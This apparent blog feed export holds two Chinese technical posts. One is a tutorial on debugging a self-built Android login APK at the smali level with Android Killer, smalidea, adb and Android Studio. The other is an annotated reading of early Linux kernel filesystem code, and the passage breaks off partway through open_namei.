    
    
    
    <entry>
      <title>动态调试apk(Java 层)</title>
      <link href="/2020/10/05/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95apk/"/>
      <url>/2020/10/05/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95apk/</url>
      
        <content type="html"><![CDATA[<h2 id="作案工具"><a href="#作案工具" class="headerlink" title="作案工具"></a>作案工具</h2><ul><li>Android Studio（我的版本是 4.0.1）</li><li>Android Killer</li><li>smalidea 插件</li></ul><p>工具及示例下载链接：</p><p>链接：<a href="https://pan.baidu.com/s/1GjBj9wSJPHZeD1dZ4B4vsg">网盘</a><br>提取码：g1wi</p><br><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="Android-Killer"><a href="#Android-Killer" class="headerlink" title="Android Killer"></a>Android Killer</h3><p>该软件集成了 apktool、dex2jar、jd-gui 等优秀安卓逆向工具，一方面方便进行 apk 的解析（目录结构、反汇编、反编译等），另一方面方便回编译、打包、签名。虽然用 baksmali、smali 的 jar 包也可以做到 dex2smali 和 smali2dex，但能用有 GUI 的集成工具为什么要用命令行呢（（（</p><br><h3 id="smalidea-插件"><a href="#smalidea-插件" class="headerlink" title="smalidea 插件"></a>smalidea 插件</h3><p>下载地址 <a href="https://bitbucket.org/JesusFreke/smali/downloads/?tab=downloads">https://bitbucket.org/JesusFreke/smali/downloads/?tab=downloads</a></p><p>下载 smalidea-0.0x.zip（zip 格式），无需解压</p><p><img src="../img/1.png" alt="smalidea下载"></p><p>打开 AS ，选择 <code>File -&gt; Settings -&gt; Plugins</code></p><p><img src="../img/2.png" alt="smalidea安装"></p><p>点击图中的齿轮图标，选择 <code>Install Plugin from Disk</code>，并指定刚才下载的 zip 压缩包，Apply 后重启 AS</p><p>不过此时仍无法在 smali 文件中下断点，因为在 AS4.0 中还绑定安装了一个 smali 语法高亮的插件——Smali Support，如图：</p><p><img src="../img/3.png" alt="smali support"></p><p>该插件抢占了 smalidea 对于 *.smali 文件的解析权，在 Settings 的 <code>Editor -&gt; File Types</code> 中找到 Smali：</p><p><img src="../img/4.png" alt="File Types"></p><p>可以看到有两个，上面那个是 Smali Support 的，下面才是 smalidea，点击右边的减号去掉 Smali Support 对 *.smali 的解析，点击第二个 Smali，并点击加号添加 smalidea 对于 *.smali 的解析</p><p><img src="../img/5.png" alt="添加smalidea解析"></p><p>Apply 一下，现在就可以愉快地在 smali 文件中下断点了（点击行号旁边的空白处）</p><p><img src="../img/6.png" alt="下断点"></p><br><h2 id="调试-apk"><a href="#调试-apk" class="headerlink" title="调试 apk"></a>调试 apk</h2><p>现在展示如何调试一个拿到手的 apk，本例 apk 是我套着模板写的一个用户登录界面，分别生成了 release 版本（已签名）和 debug 版本（未签名，testOnly），下图是应用的界面</p><p><img src="../img/22.png" alt="apk运行"></p><p>逻辑很简单，email 一栏是 <code>in1t</code>，password 一栏是 <code>123456</code> 的话就会显示 <code>welcome! in1t</code></p><p>下面是详细的步骤，共 6 步</p><h3 id="使用-Andoird-Killer-反编译"><a href="#使用-Andoird-Killer-反编译" class="headerlink" title="使用 Andoird Killer 反编译"></a>使用 Andoird Killer 反编译</h3><p>在 Android Killer 中打开目标 apk，等待其反编译，当弹出是否需要对当前工程进行分析的窗口时，选择“否”即可。在工程管理器中可以看到 MyApplication 反编译后的 smali 代码</p><p><img src="../img/7.png" alt="反编译后"></p><p>这些反编译后的代码会保存在 Android Killer 根目录下的 <code>projects</code> 目录中</p><p><img src="../img/8.png" alt="项目在ak中的路径"></p><p>另外，点开 <code>AndroidManifest.xml</code>，确认 <code>&lt;application&gt;标签</code> 中是否有 <code>android:debuggable=&quot;true&quot;</code>，如果有的话，可以直接跳到下一步</p><p>如果没有，就需要修改该文件，为其添加 debuggable 属性，不然后面附加进程的时候会找不到该 apk</p><p><img src="../img/23.png" alt="添加debuggable属性"></p><p>修改后需要重新编译、签名，这些可以在 Android Killer 中一键完成，不过需要预先配置</p><p>首先是通过以下指令生成密钥库，其中 alias、keypass、keystore、storepass 可以根据自己的需求进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -alias in1t -keypass 123456 -keyalg RSA -keysize 1024 -validity 3650 -keystore D:\AndroidStudioProjects\appkey.keystore -storepass 123456</span><br></pre></td></tr></table></figure><p>一路回车，最后输入 y 来确定生成，在 Android Killer 中 进行配置，保证勾选上 <code>编译完后自动签名</code></p><p><img src="../img/24.png" alt="配置"></p><p>下方的签名处点击添加，按图填写，点击确定</p><p><img src="../img/25.png" alt="配置"></p><p>来到 Android 选项卡，点击编译下面的小三角，选择刚添加的签名配置，点击编译</p><p><img src="../img/26.png" alt="编译签名"></p><p>编译签名完成后，下方的状态栏会显示 apk 的生成路径，第 4 步安装 apk 时，请安装这个加了 debuggable 的 apk</p><p><img src="../img/27.png" alt="编译签名"></p><br><h3 id="在-AS-中导入反编译后的项目并下断点"><a href="#在-AS-中导入反编译后的项目并下断点" class="headerlink" title="在 AS 中导入反编译后的项目并下断点"></a>在 AS 中导入反编译后的项目并下断点</h3><p>选择 <code>File -&gt; New -&gt; Import Project</code> ，并选择刚才反编译项目的 <code>Project 目录</code>，</p><p><img src="../img/9.png" alt="选择Project目录"></p><p>一路 next 后，打开 Project 视窗，找到想下断点的 smali 文件双击打开，并点击行号旁边的空白处下断点</p><p><img src="../img/10.png" alt="下断点"></p><br><h3 id="运行模拟器"><a href="#运行模拟器" class="headerlink" title="运行模拟器"></a>运行模拟器</h3><p>我用的是在 AS 中下载的模拟器，连接第三方模拟器的方法请自行百度，在 AVD Manager 中打开模拟器</p><p><img src="../img/11.png" alt="AVD Manager"></p><br><h3 id="在模拟器中安装-apk"><a href="#在模拟器中安装-apk" class="headerlink" title="在模拟器中安装 apk"></a>在模拟器中安装 apk</h3><p>打开模拟器后，在 cmd 中输入 <code>adb install apk路径名</code> 来安装 release 版本的 apk，如果出现如下错误，表示该 apk 是 debug 版本，需要额外加一个 -t 选项来安装，即 <code>adb install -t apk路径名</code></p><p><img src="../img/12.png" alt="安装apk"></p><p>可以看到，应用已经成功安装</p><p><img src="../img/13.png" alt="安装apk"></p><br><h3 id="以调试模式启动-apk"><a href="#以调试模式启动-apk" class="headerlink" title="以调试模式启动 apk"></a>以调试模式启动 apk</h3><p>在Android中，除了从界面上启动程序之外，还可以从命令行启动程序，使用的是命令行工具 am</p><p>在 cmd 中输入 <code>adb shell am start -D -n package_name/activity_name</code></p><p>-D 参数表示允许调试，-n 用于指定需要启动的程序</p><p>其中，package_name 与 activity_name 在该 apk 的 <code>AndroidManifest.xml</code> 可以获取。在 Android Killer 中打开解析后的 AndroidManifest.xml，<code>&lt;manifest&gt;标签</code> 中有一个属性叫 <code>package</code>，其值为 package_name，在本例中为 com.example.myapplication</p><p><img src="../img/14.png" alt="package_name"></p><p>不论是否有多个 Activity，activity_name 一般都用程序入口 Activity 的，这里为 <code>com.example.myapplication.ui.login.LoginActivity</code></p><p><img src="../img/15.png" alt="activity_name"></p><p>所以在本例中，需要在 cmd 中输入：</p><p><img src="../img/16.png" alt="等待debug"></p><p>此时，模拟器中应有如下提示：</p><p><img src="../img/17.png" alt="等待debug"></p><br><h3 id="使用-AS-附加等待调试的-apk"><a href="#使用-AS-附加等待调试的-apk" class="headerlink" title="使用 AS 附加等待调试的 apk"></a>使用 AS 附加等待调试的 apk</h3><p>点击 AS 工具栏中的 <code>Attach Debugger to Android Process</code> ，在弹出的窗口中选中 <code>Show all processes</code>，并选择待调试的进程，点击 OK</p><p><img src="../img/18.png" alt="附加进程"></p><p>现在已经开始调试了，在模拟器的两个输入框中输入用户名及密码，点击登录按钮，即可断在之前下断点的地方</p><p><img src="../img/19.png" alt="调试界面"></p><p>需要注意的是，单步步过在这里不太好使，因为 java 的一行源码被编译成了多行 smali 代码，单步执行（这里更像是单行执行）一次会跳过多行 smali 代码。我更倾向于将光标放在希望调试器停下的位置，然后使用 <code>Run to Cursor (Alt + F9)</code> 来实现 smali 代码的单行调试</p><p>譬如此处：</p><p><img src="../img/20.png" alt="smali单行调试"></p><p>源码中的 117 行代码被编译成了 4 条 smali 代码，此时程序停在调用 getText() 函数的地方，现在我想看看调用完 getText 后 v2 的值是什么，如果使用 F7 单步步入，那会进到 getText 函数，如果使用 F8 步过，那就会直接执行完这四条指令去到下面的 .line 116 处对于 login 的调用。所以这里将光标放在调用 toString 处，点击下方 Run to Cursor 按钮，再在右下角的 Watches 窗口添加 v2，即可查看此时 v2 的值</p><p><img src="../img/21.png" alt="smali单行调试"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-fs</title>
      <link href="/2020/06/06/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-fs/"/>
      <url>/2020/06/06/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-fs/</url>
      
        <content type="html"><![CDATA[<h2 id="高速缓冲区的管理方式"><a href="#高速缓冲区的管理方式" class="headerlink" title="高速缓冲区的管理方式"></a>高速缓冲区的管理方式</h2><p>整个高速缓冲区被划分为 1024 字节一块的缓冲块，正好与块设备上的磁盘逻辑块大小相同。在高速缓冲区初始化时，初始化程序分别从缓冲区的<strong>两端</strong>开始，分别同时设置<strong>缓冲头</strong>和划分出对应的<strong>缓冲块</strong>，如图所示：</p><p><img src="../img/g1.png" alt="缓冲区概况"></p><p><strong>缓冲头</strong>是定义在 include/linux/fs.h 中的一个结构体，用于描述对应缓冲块的各种属性，并用于将所用缓冲头连成链表。<strong>缓冲块的划分</strong>一直持续到缓冲区中没有足够的内存再划分出缓冲块为止</p><p>缓冲头的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/linux/fs.h Line 68</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> * b_data;<span class="comment">// 指向对应缓冲块起始地址</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> b_blocknr;<span class="comment">// 缓冲块的块号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> b_dev;<span class="comment">// 数据源的设备号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_uptodate;<span class="comment">// 更新标志，表示数据是否已经更新</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_dirt;<span class="comment">// 修改标志，为 0 表示未被修改，为 1 表示已被修改过</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_count;<span class="comment">// 使用该块的用户数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> b_lock;<span class="comment">// 缓冲块是否被锁定，1 表示被上锁</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">b_wait</span>;</span><span class="comment">// 指向等待该缓冲块解锁的任务</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_prev</span>;</span><span class="comment">// hash 队列的前一块</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_next</span>;</span><span class="comment">// hash 队列的下一块</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_prev_free</span>;</span><span class="comment">// 空闲表的前一块</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">b_next_free</span>;</span><span class="comment">// 空闲表的下一块</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>b_blocknr</strong> 与 <strong>b_dev</strong> 唯一确定了缓冲块中的数据对应的块设备和数据块</p><p><strong>b_count</strong> 字段表示引用该块的进程数，当其不为 0 时，缓冲管理程序就不能释放该块。程序申请读/写硬盘上的一个块时，会先在高速缓冲中申请一个块，若在 hash 表中能得到指定的块，则该块的 b_count 增加 1，否则表示缓冲块是重新申请得到的，该块的 b_count 置为 1。当程序释放一个块时，该块的 b_count 减 1</p><p><strong>b_lock</strong> 为锁定标志，当其为 1 时，表示驱动程序正在对该缓冲块内容进行修改。更新缓冲块中的数据时，进程会主动睡眠，此时其他进程就有访问同样缓冲块的机会，因此在睡眠前该缓冲块对应缓冲头的 b_lock 字段被置 1</p><p><strong>b_dirt</strong> 为修改标志，表示缓冲块中的内容是否与块设备上对应数据块的内容不同。b_uptodate 为数据更新标志，用于说明缓冲块中的数据是否有效。</p><ul><li>初始化或释放块时，这两个标志均置为 0，表示该缓冲块中的数据无效</li><li>当数据被写入缓冲块但还没有被写入块设备中时，b_dirt = 1，b_uptodate = 0</li><li>当数据被写入块设备或刚从块设备中读入缓冲块时，b_dirt = 0，b_uptodate = 1</li><li>在新申请一个缓冲块时，这两个标志均为 1</li></ul><p><strong>b_prev_free</strong> 与 <strong>b_next_free</strong> 字段用于构建空闲缓冲块对应缓冲头的双向链表，如图：</p><p><img src="../img/g2.png" alt="空闲缓冲头构成双向链表"></p><p><strong>b_prev</strong> 与 <strong>b_next</strong> 字段用于构建 hash 表。buffer.c 中使用具有 307 个缓冲头指针项的 hash 数组表结构，从而达到快速而有效地在缓冲区中寻找请求的数据块是否已经被读入到缓冲区中的目的。这两个字段就是用于 hash 表中国<strong>散列在同一项</strong>上多个缓冲块之间的双向链接，如图所示：</p><p><img src="../img/g3.png" alt="缓冲头的hash表"></p><p>图中的双箭头实线表示散列在同一 hash 表项中缓冲头结构体之间的双向链接指针。虚线表示缓冲区中所有缓冲块组成的一个双向循环链表（即所谓的空闲链表），实际上这个双向链表是最近最少使用链表（LRU）</p><br><h2 id="读取文件的完整过程"><a href="#读取文件的完整过程" class="headerlink" title="读取文件的完整过程"></a>读取文件的完整过程</h2><p>前面也铺垫的差不多了，接下来，通过一个文件从打开（open）、读取（read）到关闭（close）的过程来整体把握文件系统，其中涉及的一些较为底层的函数现在只需知道功能即可</p><p>首先修改一下 main.c 的 init 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">char</span> msg[<span class="number">80</span>];</span><br><span class="line"></span><br><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/usr/root/hello.c&quot;</span>, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">msg[read(fd, msg, <span class="number">79</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码实现打开 hello.c 并获取其句柄、读取并输出其内容及关闭文件，运行结果：</p><p><img src="../img/d1.png" alt="hello.c内容"></p><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>open 实际上是一个系统调用，在 system_call 中调用 sys_open，参数 filename 为要打开的文件名字符串指针；flag 为打开文件的标志（只读、只写、可读可写等）；mode 只有在创建文件时才会被用于指定文件的许可属性（如 0664）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/open.c Line 138</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename,<span class="keyword">int</span> flag,<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> i,fd;</span><br><span class="line"></span><br><span class="line">mode &amp;= <span class="number">0777</span> &amp; ~current-&gt;umask;<span class="comment">// umask 的作用在这里体现(参考 umask 指令)</span></span><br><span class="line"><span class="keyword">for</span>(fd=<span class="number">0</span> ; fd&lt;NR_OPEN ; fd++)<span class="comment">// 遍历进程打开文件数组 flip</span></span><br><span class="line"><span class="keyword">if</span> (!current-&gt;filp[fd])<span class="comment">// 寻找一个空闲项</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (fd&gt;=NR_OPEN)<span class="comment">// 没有空闲项则返回出错码</span></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">// 设置进程执行时关闭文件句柄位图，将找出的空闲项对应的比特位复位</span></span><br><span class="line">current-&gt;close_on_exec &amp;= ~(<span class="number">1</span>&lt;&lt;fd);</span><br><span class="line">f=<span class="number">0</span>+file_table;<span class="comment">// f 指向文件表数组起始</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_FILE ; i++,f++)<span class="comment">// 遍历文件表，寻找空闲项</span></span><br><span class="line"><span class="keyword">if</span> (!f-&gt;f_count) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (i&gt;=NR_FILE)<span class="comment">// 文件表数组没有空闲项，返回出错码</span></span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">(current-&gt;filp[fd]=f)-&gt;f_count++;<span class="comment">// 该项的文件引用计数加 1</span></span><br><span class="line"><span class="comment">// 获得 filename 对应文件的 i 节点指针，如果出错，释放刚找到的空闲项</span></span><br><span class="line"><span class="keyword">if</span> ((i=open_namei(filename,flag,mode,&amp;inode))&lt;<span class="number">0</span>) &#123;</span><br><span class="line">current-&gt;filp[fd]=<span class="literal">NULL</span>;</span><br><span class="line">f-&gt;f_count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sys_open 函数还没有结束，但这里有必要打断一下，来说说 task_struct 中的 filp 字段与文件表数组 file_table 的关系，及 close_on_exec 字段的含义；之后深入 open_namei 函数去查看其实现细节</p><ol><li><p>flip 与 file_table</p><p>os 维护着一张元素个数为 64（NR_FILE）的打开文件表，名为 file_table，该数组的元素类型为 <strong>file 结构体</strong>，记录着所有已被打开的文件的信息；每个进程的 task_struct 结构体中都有一个元素个数为 20（NR_OPEN）的 file 结构体<strong>指针数组</strong>，如果其中的某一项非空（NULL），其必定指向 file_table 数组中的一个 file 结构体，表示该进程捏着这个文件的句柄，可以对其进行合法的操作</p><p>那么现在就好解释为什么标准输入的句柄是 0，标准输出的句柄是 1 了。还记得 init 函数中的操作吗：<code>(void) open(&quot;/dev/tty0&quot;,O_RDWR,0);</code> 该函数以可读可写模式打开终端设备，此时 1 号进程的 filp 数组为空，故 filp[0] 为 sys_open 中找到的空闲项。在 open 系统调用成功返回后，file_table 中就会有一项 tty0 的 file 结构体，而 1 号进程的 filp[0] 就指向该结构体。之后 init 调用 <code>(void) dup(0);</code> 复制文件句柄，即使得 filp[1] 也同样指向 tty0 的 file结构体。以此类推，标准错误的句柄在第二次 dup 后应该为 2。你会发现，所谓的<strong>文件句柄</strong>，其实是进程 task_struct 结构体中 <strong>filp 数组的下标</strong></p></li><li><p>close_on_exec</p><p>task_struct 中该字段用于确定在调用 execve 时需要关闭的文件句柄，类型为 <code>unsigned long</code> ，每一个比特位对应一个打开着的文件描述符。当进程创建出子进程后，往往会调用 execve 加载新的程序，此时若文件句柄在 close_on_exec 中对应的比特位为 1，则执行 do_execve 时，该文件将被关闭。在打开一个文件时，默认情况下文件句柄在子进程中也处于打开状态</p></li></ol><p>下面来研究 open_namei 是如何通过 pathname 来找到文件对应 i 节点的，粗略的过程及目录项结构体的定义在 <a href="https://in1nit1t.github.io/2020/05/04/Minix-1-0-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">Minix 1.0 文件系统</a> 一文中有所提及，此时 pathname 为 “/usr/root/hello.c”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fs/namei.c Line 337</span></span><br><span class="line"><span class="comment">// 最后一个参数用于保存文件路径 pathname 对应 i 节点的指针(保存函数返回值)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_namei</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * pathname, <span class="keyword">int</span> flag, <span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="params"><span class="function">struct m_inode ** res_inode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * basename;</span><br><span class="line"><span class="keyword">int</span> inr,dev,namelen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">dir</span>, *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">bh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dir_entry</span> * <span class="title">de</span>;</span></span><br><span class="line"><span class="comment">// 如果文件访问模式是只读，但文件截零标志 O_TRUNC 置位，则添加只写 O_WRONLY 标志</span></span><br><span class="line"><span class="keyword">if</span> ((flag &amp; O_TRUNC) &amp;&amp; !(flag &amp; O_ACCMODE))</span><br><span class="line">flag |= O_WRONLY;</span><br><span class="line"><span class="comment">// 下面两句作用是产生一个 mode，当指定文件不存在需要创建时，将其作为新文件的属性</span></span><br><span class="line">mode &amp;= <span class="number">0777</span> &amp; ~current-&gt;umask;</span><br><span class="line">mode |= I_REGULAR;<span class="comment">// I_REGULAR 表示常规文件</span></span><br><span class="line"><span class="comment">// dir_namei 返回值为目录 &quot;/usr/root&quot; 对应的 i 节点指针，</span></span><br><span class="line"><span class="comment">// namelen 为 &quot;hello.c&quot; 长度，basename 指向字符串 &quot;hello.c&quot;</span></span><br><span class="line"><span class="comment">// 相当于将 pathname 进行切割，分成父级及以上目录 &quot;/usr/root&quot; 与 basename &quot;hello.c&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!(dir = dir_namei(pathname,&amp;namelen,&amp;basename)))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (!namelen) &#123;<span class="comment">// 如果 basename 的长度为 0，表示操作的是目录</span></span><br><span class="line"><span class="keyword">if</span> (!(flag &amp; (O_ACCMODE|O_CREAT|O_TRUNC))) &#123;<span class="comment">// 如果操作不是读写、创建、截零</span></span><br><span class="line">*res_inode=dir;<span class="comment">// 直接返回目录对应的 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">iput(dir);<span class="comment">// 到这里表示操作非法，放回 i 节点</span></span><br><span class="line"><span class="keyword">return</span> -EISDIR;<span class="comment">// 返回出错码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// find_entry 在 &quot;/usr/root&quot; 目录下查找 &quot;hello.c&quot; 对应的目录项，存放在 de 中，</span></span><br><span class="line"><span class="comment">// 并返回该目录项所在的高速缓冲块对应的缓冲头指针</span></span><br><span class="line">bh = find_entry(&amp;dir,basename,namelen,&amp;de);</span><br><span class="line"><span class="comment">// 如果缓冲头为 NULL，表示没有找到对应文件名的目录项，即只能是创建文件的操作</span></span><br><span class="line"><span class="comment">// 因为 &quot;/usr/root/hello.c&quot; 在硬盘上是存在的，所以不会进下面这个 if</span></span><br><span class="line"><span class="keyword">if</span> (!bh) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flag &amp; O_CREAT)) &#123;<span class="comment">// 如果没有 O_CREAT 标志</span></span><br><span class="line">iput(dir);<span class="comment">// 放回 i 节点，并返回出错码</span></span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!permission(dir,MAY_WRITE)) &#123;<span class="comment">// 如果用户在该目录没有写权利</span></span><br><span class="line">iput(dir);<span class="comment">// 放回 i 节点，并返回出错码</span></span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line">&#125;</span><br><span class="line">inode = new_inode(dir-&gt;i_dev);<span class="comment">// 申请一个新 i 节点</span></span><br><span class="line"><span class="keyword">if</span> (!inode) &#123;<span class="comment">// 如果失败，放回 i 节点，并返回出错码</span></span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -ENOSPC;</span><br><span class="line">&#125;</span><br><span class="line">inode-&gt;i_uid = current-&gt;euid;<span class="comment">// 设置用户 id、访问模式，置已修改标志</span></span><br><span class="line">inode-&gt;i_mode = mode;</span><br><span class="line">inode-&gt;i_dirt = <span class="number">1</span>;</span><br><span class="line">bh = add_entry(dir,basename,namelen,&amp;de);<span class="comment">// 在 &quot;/usr/root&quot; 目录下新建一个目录项</span></span><br><span class="line"><span class="keyword">if</span> (!bh) &#123;<span class="comment">// 如果失败</span></span><br><span class="line">inode-&gt;i_nlinks--;<span class="comment">// 新节点硬连接数减 1</span></span><br><span class="line">iput(inode);<span class="comment">// 放回该 i 节点与目录 i 节点，返回出错码</span></span><br><span class="line">iput(dir);</span><br><span class="line"><span class="keyword">return</span> -ENOSPC;</span><br><span class="line">&#125;</span><br><span class="line">de-&gt;inode = inode-&gt;i_num;<span class="comment">// 目录项 i 节点号置为新申请到的 i 节点号</span></span><br><span class="line">bh-&gt;b_dirt = <span class="number">1</span>;<span class="comment">// 置已修改标志</span></span><br><span class="line">brelse(bh);<span class="comment">// 释放该高速缓冲块</span></span><br><span class="line">iput(dir);<span class="comment">// 放回目录的 i 节点</span></span><br><span class="line">*res_inode = inode;<span class="comment">// 返回新文件的 i 节点指针</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">inr = de-&gt;inode;<span class="comment">// 获得 &quot;hello.c&quot; 对应 i 